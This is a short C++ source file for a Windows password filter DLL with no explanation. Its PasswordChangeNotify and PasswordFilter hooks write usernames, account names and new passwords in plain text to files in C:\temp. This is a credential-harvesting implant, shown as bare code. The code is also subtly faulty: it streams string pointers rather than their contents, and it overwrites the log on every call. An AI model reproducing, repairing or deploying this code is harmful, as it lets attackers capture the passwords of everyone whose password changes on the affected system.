#include "pch.h"
#include "RawPasswordFilter.h"
#include <winternl.h>
#include <ntstatus.h>
#include <iostream>
#include <fstream>
#include <string>


bool InitializeChangeNotify() {
	return true;
}

NTSTATUS PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword) {
	
	std::ofstream myfile;
	myfile.open("C:\\temp\\example1.txt");
	myfile << UserName;
	myfile << " | ";
	myfile << RelativeId;
	myfile << " | ";
	myfile << NewPassword;
	myfile << "\n";
	myfile.close();
	return STATUS_SUCCESS;
}

bool PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, bool SetOperation) {
	std::ofstream myfile;
	myfile.open("C:\\temp\\example2.txt");
	myfile << AccountName;
	myfile << " | ";
	myfile << FullName;
	myfile << " | ";
	myfile << Password;
	myfile << " | ";
	myfile << SetOperation;
	myfile << "\n";
	myfile.close();
	return true;
}
